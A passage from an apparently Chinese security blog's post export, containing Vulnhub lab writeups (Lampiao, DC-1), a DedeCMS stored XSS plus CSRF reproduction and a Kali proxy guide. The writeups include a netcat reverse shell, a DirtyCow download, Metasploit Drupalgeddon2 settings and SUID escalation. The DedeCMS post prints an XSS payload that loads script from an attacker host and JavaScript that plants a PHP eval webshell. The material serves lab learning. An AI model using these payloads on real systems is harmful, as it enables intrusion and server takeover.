    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>Talk is cheap, show me writeup</strong></p>
<blockquote>
<p><strong>用到的工具与知识</strong></p>
<p>nmap、hydra、cewl、whatweb、metasploit、脏牛提权</p>
</blockquote>
<p><a href="https://download.vulnhub.com/lampiao/Lampiao.zip" target="_blank" rel="noopener">靶机下载</a></p>
<a id="more"></a>

<h2 id="0x01-情报搜集"><a href="#0x01-情报搜集" class="headerlink" title="0x01 情报搜集"></a>0x01 情报搜集</h2><p>nmap刺探一下信息</p>
<p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/1.png" alt></p>
<p>可以看到开启了22/ssh，80/http，1898/http，三个端口，看到ssh可以想到ssh爆破。</p>
<p>先往下，我们先进一步搜集信息，不贸然出动</p>
<p>用浏览器访问一下网站相应端口</p>
<p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/2.png" alt></p>
<p>一个船长的人头？我喜欢，我们再看看别的端口</p>
<p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/3.png" alt></p>
<p>嗯，一个不错的Drupal CMS，仔细观察之后发现两个用户，再看一眼文章内容</p>
<p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/4.png" alt></p>
<p>我把文章页面的内容用<code>cewl</code>抓下来做成字典，再加上之前的用户名我们用来爆破ssh</p>
<p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/5.png" alt></p>
<p><strong>小插曲：</strong></p>
<p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/6.png" alt></p>
<p>有够幸运（因为这靶机一般不可能是用爆破来解），我们爆破出来了一个ssh账户密码，登一下试试，直接拿到了一个低权限的账户。</p>
<p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/7.png" alt></p>
<p>经过一番长时间的试错，我们从众多exp中找到了能用的DirtyCow（脏牛提权），原理是直接将密码算法逆向解密，所以跑起来很快。上传文件（我用的MobaXterm）之后，按照exp内的提示在靶机上编译运行</p>
<p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/8.png" alt></p>
<p>成功提权，拿到flag</p>
<p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/9.png" alt></p>
<p><strong>回归正常流程：</strong></p>
<p>从CMS进一步获取信息，服务器等中间件的信息可以使用whatweb</p>
<p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/12.png" alt></p>
<p>路径、敏感文件、指纹什么的，我会用Nikto、dirburster、dirb</p>
<p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/10.png" alt></p>
<p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/11.png" alt></p>
<p>由上面找到的信息，进一步查看robots.txt</p>
<p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/13.png" alt></p>
<p>发现能够看CHANGELOG.txt，这个文件一般会包含详细版本号，以及大量修改信息</p>
<p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/14.png" alt></p>
<p>果然，可以看到详细版本号是<code>Drupal 7.54</code></p>
<h2 id="0x02-漏洞挖掘与利用"><a href="#0x02-漏洞挖掘与利用" class="headerlink" title="0x02 漏洞挖掘与利用"></a>0x02 漏洞挖掘与利用</h2><p>看到CMS我就忍不住想测试一下逻辑漏洞、XSS和SQL注入。结果发现创建不了用户，密码找回和SQL注入也相继失败，那么我只好从exploit-db找找有没有相应的drupal漏洞了。</p>
<p>嗯，用rb的exp得到一个fake shell，路径都无法变更。。。</p>
<p>又是一番试错，我们打开了msf，<code>search drupal 7.54</code>，自然选择时间靠后的exp</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Drupal Drupalgeddon 2 Forms API Property Injection</span><br></pre></td></tr></table></figure>

<p>显示参数有什么需要填写，填写相应参数</p>
<p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/15.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">show options</span><br><span class="line">set rhost 192.168.206.138 # 设置攻击主机</span><br><span class="line">set rport 1898 # 设置攻击端口</span><br><span class="line">exploit # 进行攻击</span><br></pre></td></tr></table></figure>

<p>成功拿到meterpreter，进入目标机的shell，我看看基本信息</p>
<p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/16.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">shell # 进入目标机的shell</span><br><span class="line">uname -a # 显示操作系统版本信息</span><br><span class="line">id # 获取当前用户信息</span><br><span class="line">cat /etc/issue # 获取当前版本信息</span><br><span class="line">python -c "import pty;pty.spawn('/bin/bash');" # 拿python交互shell</span><br></pre></td></tr></table></figure>

<p>OK！到这一步我就直接用之前的脏牛提权解决问题</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://www.exploit-db.com/download/40847 # 下载exp</span><br><span class="line">mv 40847 40847.cpp # 更改文件名</span><br><span class="line">g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil # 编译</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 解释一下编译的各个参数</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># -Wall 允许发出GCC能提供的所有有用警告</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># -pedantic 允许发出ANSI/ISO C标准列出的所有警告</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># -O2 编译器优化的四个级别，0没有优化，1为缺省值，3为最高</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># -std=c++11 用c++11标准编译</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># -pthread Linux中用到多线程时，需要链接pthread库</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># -o dcow 生成目标文件，命名为dcow</span></span></span><br></pre></td></tr></table></figure>

<h2 id="0x03-提权-amp-GetFlag"><a href="#0x03-提权-amp-GetFlag" class="headerlink" title="0x03 提权&amp;GetFlag"></a>0x03 提权&amp;GetFlag</h2><p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/17.png" alt></p>
<p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/18.png" alt></p>
<p>发现一张帅图，你好，船长！（虽然是寨主）</p>
<p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/lampiao.jpg" alt></p>
<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><ul>
<li>除了走正常的流程，试错也很关键，在获取足够信息的基础上尽可能缩小试错的范围，同时试错也不要一根筋，掉到兔子洞里去，不时转换一下思路or休息一会都可能有不同程度的帮助</li>
<li>工具和信息搜集的熟悉程度决定了后面的攻击效果</li>
</ul>
<h2 id="0x05-参考资源"><a href="#0x05-参考资源" class="headerlink" title="0x05 参考资源"></a>0x05 参考资源</h2><p><a href="https://blog.csdn.net/weixin_43784056/article/details/103604578" target="_blank" rel="noopener">vulnhub靶机-Lampiao</a></p>
<p><a href="https://resources.infosecinstitute.com/lampiao-1-ctf-walkthrough/#gref" target="_blank" rel="noopener">Lampiao：CTF WalkThrough</a></p>
<p><a href="https://jgeek.cn/archive/id/23.html" target="_blank" rel="noopener">Lampiao1 渗透测试</a></p>
]]></content>
      <categories>
        <category>打靶</category>
        <category>pentest training</category>
      </categories>
      <tags>
        <tag>Vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnhub DC-1 Writeup</title>
    <url>/2020/03/05/Vulnhub-DC-1-Writeup/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>Talk is cheap, show me writeup</strong></p>
<blockquote>
<p><strong>用到的工具和知识</strong></p>
<p>nmap、whatweb、searchsploit、netcat、SUID提权</p>
</blockquote>
<p><a href="https://www.vulnhub.com/entry/dc-1,292/" target="_blank" rel="noopener">靶机下载</a></p>
<a id="more"></a>

<h2 id="0x01-信息搜集"><a href="#0x01-信息搜集" class="headerlink" title="0x01 信息搜集"></a>0x01 信息搜集</h2><p>我们先开启靶机和kali，两者均为NAT模式</p>
<p><img src="/2020/03/05/Vulnhub-DC-1-Writeup/1.jpg" alt></p>
<p>我用mobaxterm连上kali（192.168.206.128），用nmap扫描局域网找到靶机ip（192.168.206.137）</p>
<p><img src="/2020/03/05/Vulnhub-DC-1-Writeup/2.jpg" alt></p>
<p>扫一下靶机端口，发现开启了ssh、http、<a href="https://zh.wikipedia.org/wiki/%E9%81%A0%E7%A8%8B%E9%81%8E%E7%A8%8B%E8%AA%BF%E7%94%A8" target="_blank" rel="noopener">rpc</a></p>
<p><img src="/2020/03/05/Vulnhub-DC-1-Writeup/3.jpg" alt></p>
<p>我们再查看一下所有信息</p>
<p><img src="/2020/03/05/Vulnhub-DC-1-Writeup/4.jpg" alt></p>
<ul>
<li><p>可以看到相应的ssh版本，google了一下发现此版本不能爆破</p>
<blockquote>
<p>验证：</p>
<p>爆破之后报错</p>
<p>[ERROR] target ssh://192.168.206.137:22/ does not support password authentication. </p>
<p><a href="https://security.stackexchange.com/questions/183848/hydra-fails-with-error-target-ssh-192-168-16-12822-does-not-support-passw" target="_blank" rel="noopener">网上解答</a>，并不支持password认证可能是设定要用键盘键入提示框那种认证</p>
</blockquote>
</li>
</ul>
<p>ssh放掉，那我们继续往下，看到扫描记录有http服务和相应的目录，我们顺势firefox访问一波主页</p>
<p><img src="/2020/03/05/Vulnhub-DC-1-Writeup/5.jpg" alt></p>
<p>上网搜了一下 Drupal，是个广泛应用的开源cms，当然也有相应的CVE</p>
<p>尝试创建账号，发现还需要管理员认可才能创建账号，GG，还是按照正常程序走吧。</p>
<p><img src="/2020/03/05/Vulnhub-DC-1-Writeup/6.jpg" alt></p>
<p>用<code>whatweb</code>探查一下所用的技术，发现</p>
<p>PHP：5.4.45-0+deb7u14</p>
<p>Apache：2.2.22</p>
<p>OS：debian</p>
<p>Drupal version：7</p>
<p><img src="/2020/03/05/Vulnhub-DC-1-Writeup/7.jpg" alt></p>
<p>我们得到了一些基本信息，可是比较重要的cms详细版本号没搞到，而且试图查看CHANGELOG.txt也不可用（被删或改名）</p>
<p><img src="/2020/03/05/Vulnhub-DC-1-Writeup/8.jpg" alt></p>
<h2 id="0x02-漏洞挖掘与利用"><a href="#0x02-漏洞挖掘与利用" class="headerlink" title="0x02 漏洞挖掘与利用"></a>0x02 漏洞挖掘与利用</h2><p>既然想高效一点，我们还是先找找exp，这里可以上exp-db去找，当然我也可以在kali里用<code>searchsploit drupal 7</code>找找kali自带离线库内所有version 7的exp</p>
<p><img src="/2020/03/05/Vulnhub-DC-1-Writeup/9.jpg" alt></p>
<p><img src="/2020/03/05/Vulnhub-DC-1-Writeup/11.jpg" alt></p>
<p>选择红框内脚本，添加一个admin用户</p>
<p><img src="/2020/03/05/Vulnhub-DC-1-Writeup/12.jpg" alt></p>
<p>可以看到我们的脚本成功执行了，我们直接用刚才创建的账号登进去，一番搜查发现有个flag3页面，</p>
<p><img src="/2020/03/05/Vulnhub-DC-1-Writeup/13.jpg" alt></p>
<p>这句话似乎给我们打了个哑谜，能发现他强调了FIND、PERM和exec，继续找找发现并没有什么可以利用的，于是google了一下思路，ε=ε=ε=┏(゜ロ゜;)┛</p>
<p>其实可以装个shell插件的，对于web后端可能会有这样的服务，学习了，我们继续往下进行</p>
<p><img src="/2020/03/05/Vulnhub-DC-1-Writeup/14.jpg" alt></p>
<p><img src="/2020/03/05/Vulnhub-DC-1-Writeup/15.jpg" alt></p>
<p>我们找到后台的模块安装处，直接点击安装模块</p>
<p><img src="/2020/03/05/Vulnhub-DC-1-Writeup/16.jpg" alt></p>
<p><img src="/2020/03/05/Vulnhub-DC-1-Writeup/17.jpg" alt></p>
<p>有两种安装模式，直接用链接模式，我们在原来的shell module页面底部找到插件，提取链接，粘贴到相应位置，安装</p>
<p><img src="/2020/03/05/Vulnhub-DC-1-Writeup/19.jpg" alt></p>
<p>安装完成，我们看看模块，发现任何用户都可以使用这个shell模块，可是在模块处并不能直接打开shell，找了找shell的位置，在dashboard发现了shell链接，我们点开</p>
<p><img src="/2020/03/05/Vulnhub-DC-1-Writeup/20.jpg" alt></p>
<p>cool！看看OS版本和用户信息，find查找flag文件，发现了一个<code>flag1.txt</code></p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Linux DC-1 3.2.0-6-486 #1 Debian 3.2.102-1 i686 GNU&#x2F;Linux</span><br><span class="line">uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)</span><br><span class="line">Debian GNU&#x2F;Linux 7 \n \l</span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="/2020/03/05/Vulnhub-DC-1-Writeup/21.jpg" alt></p>
<p>我这里先采用nc拿个反弹shell，再用python pty升级为交互shell</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> kali </span></span><br><span class="line">nc -lvnp 4444</span><br><span class="line"><span class="meta">#</span><span class="bash"> backend<span class="string">'s shell</span></span></span><br><span class="line">nc 192.168.206.140 4444 -e /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> kali</span></span><br><span class="line">python -c "import pty; pty.spawn('/bin/bash');"</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/05/Vulnhub-DC-1-Writeup/22.jpg" alt></p>
<p>找到<code>flag4.txt</code>，我们能用相同的方式找到root的flag吗？可能吧，不过没那么简单，又或许很简单</p>
<h2 id="0x03-提权-amp-GetFlag"><a href="#0x03-提权-amp-GetFlag" class="headerlink" title="0x03 提权&amp;GetFlag"></a>0x03 提权&amp;GetFlag</h2><p>从寻找flag1 3 4 过程中我们能够体会到，作者一直在提find，而且我们用find查找的时候也不那么顺心，似乎权限有限制。</p>
<p>好那么就顺着作者引导的思路，再次google <code>find 提权</code></p>
<p><img src="/2020/03/05/Vulnhub-DC-1-Writeup/23.jpg" alt></p>
<p>除去第一个结果（考试的时候泄题机ji率ben较wei小ling），别的搜索结果比较让人满意，看来思路还没跑偏，确实有这么个东西，赶紧拿过来学学</p>
<p><a href="https://www.anquanke.com/post/id/86979" target="_blank" rel="noopener">SUID提权入门</a></p>
<p>我试了试vim提权，结果到文件里出不来，反弹shell都亲手干掉了</p>
<p><img src="/2020/03/05/Vulnhub-DC-1-Writeup/24.jpg" alt></p>
<p>看了下root权限的可执行文件，vim也不在其中，算了，直接find提权</p>
<p>条件是：</p>
<ol>
<li>find要查询的文件要存在，否则其后<code>-exec</code>并不会执行</li>
<li>find要查询的文件要尽可能只有一个，否则<code>-exec</code>语句会被执行多次（这条某些情况下可以忽略）</li>
</ol>
<p>这里有两种方式：</p>
<ul>
<li>直接在<code>/var/www</code>下查找一个单一的文件</li>
<li>创建一个唯一的文件</li>
</ul>
<p><img src="/2020/03/05/Vulnhub-DC-1-Writeup/25.jpg" alt></p>
<p>测试成功，读取到最后的flag，然鹅这里只有用<code>/bin/sh</code>才能提权而<code>/bin/bash</code>无法提权，查了点资料，不过也不在点上，暂且留坑了</p>
<blockquote>
<ul>
<li>/bin/bash（Bourne-again shell）是sh的扩展版，Linux默认shell就是bash，与 sh（Bourne shell） 完全向后兼容，并且在Bourne shell 的基础上增加、增强了很多特性。Bash放在/bin/bash中，它有许多特色，可以提供如命令补全、命令编辑和命令历史表等功能，它还包含了很多 C shell 和 Korn shell 中的优点，有灵活和强大的编程接口，同时又有很友好的用户界面。</li>
<li><strong>在一般的linux系统当中（如redhat），使用sh调用执行脚本相当于打开了bash的POSIX标准模式</strong>，也就是说 /bin/sh 相当于 /bin/bash –posix</li>
<li>GNU/Linux 操作系统中的 /bin/sh 本是 bash (Bourne-Again Shell) 的符号链接，但鉴于 bash 过于复杂，有人把 ash 从 NetBSD 移植到 Linux 并更名为 dash (Debian Almquist Shell)，并建议将 /bin/sh 指向它，以获得更快的脚本执行速度。Dash Shell 比 Bash Shell 小的多，符合POSIX标准（某条语句错误则不往下执行）。</li>
</ul>
</blockquote>
<h2 id="0x04-彩蛋"><a href="#0x04-彩蛋" class="headerlink" title="0x04 彩蛋"></a>0x04 彩蛋</h2><p>咦！(⊙﹏⊙)做完了发现，收集了flag134，那2呢？</p>
<p>回头看看flag1的提示</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Every good CMS needs a config file - and so do you.</span><br></pre></td></tr></table></figure>

<p>他是在说网站配置文件，我们找到<code>/val/www/sites/default/settings.php</code></p>
<p><img src="/2020/03/05/Vulnhub-DC-1-Writeup/26.jpg" alt></p>
<p>教我们暴力并不是王道，反推可以暴力啰</p>
<p>好！用给的账户密码登入mysql</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql -u dbuser -p</span><br><span class="line">password: R0ck3t</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> show databases;</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> use drupaldb;</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> show tables;</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> select name, pass from users;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/05/Vulnhub-DC-1-Writeup/27.jpg" alt></p>
<p>拿到各个账户密码，用hashcat，这里就打住了，小辣机没有强大的GPU，不硬跑了</p>
<h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><ul>
<li>有时候尝试愚蠢的想法也有奇效，但是对于输出结果一定要敏感，思路要灵活</li>
<li>第一遍做尽量不使用msf，oscp只能一台机器用</li>
</ul>
<h2 id="0x06-参考资源"><a href="#0x06-参考资源" class="headerlink" title="0x06 参考资源"></a>0x06 参考资源</h2><p><a href="https://medium.com/@w3rallmachines/dc-1-vulnhub-walkthrough-3a2e7042c640" target="_blank" rel="noopener">DC-1 -VulnHub Walkthrough</a></p>
<p><a href="https://hackingresources.com/dc-1-1-vulnhub-walkthrough/" target="_blank" rel="noopener">DC-1 -VulnHub walkthrough</a></p>
]]></content>
      <categories>
        <category>打靶</category>
        <category>pentest training</category>
      </categories>
      <tags>
        <tag>Vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>织梦XSS+CSRF复现</title>
    <url>/2020/03/02/%E7%BB%87%E6%A2%A6XSS-CSRF%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="0x01-前期测试"><a href="#0x01-前期测试" class="headerlink" title="0x01 前期测试"></a>0x01 前期测试</h2><p>本次织梦的版本是V56_UTF8</p>
<p><img src="/2020/03/02/%E7%BB%87%E6%A2%A6XSS-CSRF%E5%A4%8D%E7%8E%B0/zhimeng_banben.jpg" alt><a id="more"></a></p>
<p>我们先创建一个账号test，开始在内容中心写文章</p>
<p><img src="/2020/03/02/%E7%BB%87%E6%A2%A6XSS-CSRF%E5%A4%8D%E7%8E%B0/zhimeng_xiewenzhang.jpg" alt></p>
<p><img src="/2020/03/02/%E7%BB%87%E6%A2%A6XSS-CSRF%E5%A4%8D%E7%8E%B0/zhimeng_xiezuo.jpg" alt></p>
<p>然后我们在所有输入框，插入<code>&lt;img src=1 onerror=alert(0) /&gt;</code>，输入验证码后发表</p>
<p><img src="/2020/03/02/%E7%BB%87%E6%A2%A6XSS-CSRF%E5%A4%8D%E7%8E%B0/charu.jpg" alt></p>
<p>预览文章发现并没有弹窗。</p>
<p><img src="/2020/03/02/%E7%BB%87%E6%A2%A6XSS-CSRF%E5%A4%8D%E7%8E%B0/weitanchuang.jpg" alt></p>
<p>可是我发现在预览文章页面有评论框，那么我们试试评论</p>
<p><img src="/2020/03/02/%E7%BB%87%E6%A2%A6XSS-CSRF%E5%A4%8D%E7%8E%B0/pinglun.jpg" alt></p>
<p>发现可以成功</p>
<p><img src="/2020/03/02/%E7%BB%87%E6%A2%A6XSS-CSRF%E5%A4%8D%E7%8E%B0/pingluntanchuang.jpg" alt></p>
<h2 id="0x02-正式开始"><a href="#0x02-正式开始" class="headerlink" title="0x02 正式开始"></a>0x02 正式开始</h2><p><strong>csrf+xss</strong>攻击链：在文章区or评论区留下存储型xss，当管理员审核的时候，该xss将在管理员访问的HTML页面新建一个<code>&lt;script&gt;</code>标签，将其src指向我们服务器上的xss.js文件，也就是把xss.js包含进来，而xss.js的效果是在<code>/data</code>目录中建立一个<code>test.php</code>文件（小马）。</p>
<p>于是我们开始配置服务器上的xss.js文件，即将xss.js放在phpstudy的WWW文件夹下</p>
<p><img src="/2020/03/02/%E7%BB%87%E6%A2%A6XSS-CSRF%E5%A4%8D%E7%8E%B0/php_xss.jpg" alt></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> request = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">window</span>.XMLHttpRequest) &#123;</span><br><span class="line">	request = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">	<span class="keyword">if</span> (request.overrideMimeType) &#123;</span><br><span class="line">		request.overrideMimeType(<span class="string">'text/xml'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">elseif(<span class="built_in">window</span>.ActiveXObject) &#123;</span><br><span class="line">	<span class="keyword">var</span> versions = [<span class="string">'Microsoft.XMLHTTP'</span>, <span class="string">'MSXML.XMLHTTP'</span>, <span class="string">'Microsoft.XMLHTTP'</span>, <span class="string">'Msxml2.XMLHTTP.7.0'</span>, <span class="string">'Msxml2.XMLHTTP.6.0'</span>, <span class="string">'Msxml2.XMLHTTP.5.0'</span>, <span class="string">'Msxml2.XMLHTTP.4.0'</span>, <span class="string">'MSXML2.XMLHTTP.3.0'</span>, <span class="string">'MSXML2.XMLHTTP'</span>];</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; versions.length; i++) &#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			request = <span class="keyword">new</span> ActiveXObject(versions);</span><br><span class="line">		&#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp = request;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFolder</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">	obj = url.split(<span class="string">'/'</span>)</span><br><span class="line">	<span class="keyword">return</span> obj[obj.length - <span class="number">2</span>]</span><br><span class="line">&#125;</span><br><span class="line">oUrl = top.location.href;</span><br><span class="line">u = getFolder(oUrl);</span><br><span class="line">add_admin();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add_admin</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> url = <span class="string">"/"</span> + u + <span class="string">"/sys_sql_query.php"</span>;</span><br><span class="line">	<span class="keyword">var</span> params = <span class="string">"fmdo=edit&amp;backurl=&amp;activepath=%2Fdata&amp;filename=haris.php&amp;str=&lt;%3Fphp+eval%28%24_POST%5Bcmd%5D%29%3F&gt;&amp;B1=++%E4%BF%9D+%E5%AD%98++"</span>;</span><br><span class="line">	xmlhttp.open(<span class="string">"POST"</span>, url, <span class="literal">true</span>);</span><br><span class="line">	xmlhttp.setRequestHeader(<span class="string">"Content-type"</span>, <span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">	xmlhttp.setRequestHeader(<span class="string">"Content-length"</span>, params.length);</span><br><span class="line">	xmlhttp.setRequestHeader(<span class="string">"Connection"</span>, <span class="string">"Keep-Alive"</span>);</span><br><span class="line">	xmlhttp.send(params);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们在评论处插入</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;img src=x onerror=<span class="built_in">document</span>.body.appendChild(<span class="built_in">document</span>.createElement(<span class="string">'script'</span>)).src=<span class="string">'//172.16.11.2/xss.js'</span>&gt;</span><br></pre></td></tr></table></figure>

<p>登上管理员账号，审核普通文章，预览文章</p>
<p><img src="/2020/03/02/%E7%BB%87%E6%A2%A6XSS-CSRF%E5%A4%8D%E7%8E%B0/shenhe.jpg" alt></p>
<p><img src="/2020/03/02/%E7%BB%87%E6%A2%A6XSS-CSRF%E5%A4%8D%E7%8E%B0/tanchuang.jpg" alt></p>
<p>因为代码中是将文件写入data文件夹，so查看一下data（模块-&gt;文件管理器-&gt;data）</p>
<p><img src="/2020/03/02/%E7%BB%87%E6%A2%A6XSS-CSRF%E5%A4%8D%E7%8E%B0/wuwu.jpg" alt></p>
<p>上菜刀，拿shell</p>
<p><img src="/2020/03/02/%E7%BB%87%E6%A2%A6XSS-CSRF%E5%A4%8D%E7%8E%B0/chenggong.jpg" alt></p>
<ul>
<li>第一种方法没走通，我选择了第二种，后来才发现在文章中插入xss是需要在富文本编辑器中使用<strong>源代码编辑</strong>方式，学到了。</li>
</ul>
<p><img src="/2020/03/02/%E7%BB%87%E6%A2%A6XSS-CSRF%E5%A4%8D%E7%8E%B0/yuandaima.jpg" alt></p>
<h2 id="0x03-反思与总结"><a href="#0x03-反思与总结" class="headerlink" title="0x03 反思与总结"></a>0x03 反思与总结</h2><ol>
<li>碰见要cms先提炼关键词搜索，做好信息搜集工作，尤其是开源项目</li>
<li>不要一味测试，更要研究学习透背后的原理</li>
</ol>
]]></content>
      <categories>
        <category>炒冷饭</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>Vmware下Kali Linux 科学上网</title>
    <url>/2020/03/01/Vmware%E4%B8%8BKali-Linux-%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote>
<p>几年前在学习RASP的时候需要下载v8引擎，可是直接在外网下又太慢，组内负责这块的小伙伴当时没有好资源、眼光也浅，于是我现在翻翻老底，把以前的问题解决一下，给我的kali和centos7（without GUI）配置ssr</p>
</blockquote>
<p>先决条件：我的windows物理机上有已经配置好的ssr和v2ray，kali和centos使用NAT连接，su权限</p>
<a id="more"></a>

<h2 id="0x01-kali配置"><a href="#0x01-kali配置" class="headerlink" title="0x01 kali配置"></a>0x01 kali配置</h2><ol>
<li>物理机ssr的选项设置，勾选允许来自局域网的连接，默认1080端口</li>
</ol>
<p><img src="/2020/03/01/Vmware%E4%B8%8BKali-Linux-%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/200218ssr1.png" alt></p>
<p><img src="/2020/03/01/Vmware%E4%B8%8BKali-Linux-%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/200218ssr2.png" alt></p>
<ol start="2">
<li>查看物理机ip</li>
</ol>
<p><img src="/2020/03/01/Vmware%E4%B8%8BKali-Linux-%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/200218ssr3.png" alt></p>
<ol start="3">
<li>在kali上测试是否能够用telnet连接，<code>telnet ip port</code></li>
</ol>
<p><img src="/2020/03/01/Vmware%E4%B8%8BKali-Linux-%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/200218ssr4.png" alt></p>
<ul>
<li>连接成功！</li>
</ul>
<ol start="4">
<li>在<code>/etc/profile.d/</code>下新增配置脚本文件</li>
</ol>
<p><img src="/2020/03/01/Vmware%E4%B8%8BKali-Linux-%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/200218ssr5.png" alt></p>
<p>写入配置<code>export ALL_PROXY=socks5://ip:port</code></p>
<p><img src="/2020/03/01/Vmware%E4%B8%8BKali-Linux-%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/200218ssr6.png" alt></p>
<p>执行初始化</p>
<p><img src="/2020/03/01/Vmware%E4%B8%8BKali-Linux-%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/200218ssr7.png" alt></p>
<ol start="5">
<li>在firefox中配置socks5代理</li>
</ol>
<p><img src="/2020/03/01/Vmware%E4%B8%8BKali-Linux-%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/200218ssr8.png" alt></p>
<ol start="6">
<li>上网测试，成功！   不过，略慢</li>
</ol>
<p><img src="/2020/03/01/Vmware%E4%B8%8BKali-Linux-%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/200218ssr9.png" alt></p>
<p>以上是浏览器的socks5代理，但是如果到了命令行环境下，我们依然想用代理连接外网呢？</p>
<h2 id="0x02-Terminal-配置"><a href="#0x02-Terminal-配置" class="headerlink" title="0x02 Terminal 配置"></a>0x02 Terminal 配置</h2><p>这里用的kali的termimal演示</p>
<ul>
<li>直接使用<code>wget</code>获取google失败</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">--2020-02-18 21:54:22--  http://www.google.com/</span><br><span class="line">正在解析主机 www.google.com (www.google.com)... 74.86.142.55, 2404:6800:4008:803::2004</span><br><span class="line">正在连接 www.google.com (www.google.com)|74.86.142.55|:80... 失败：拒绝连接。</span><br><span class="line">正在连接 www.google.com (www.google.com)|2404:6800:4008:803::2004|:80... 失败：网络不可达。</span><br></pre></td></tr></table></figure>

<ol>
<li>同上，将物理机下ssr选项设置中的允许来自局域网的连接勾选，查看物理机ip</li>
<li>修改centos上http_proxy和https_proxy</li>
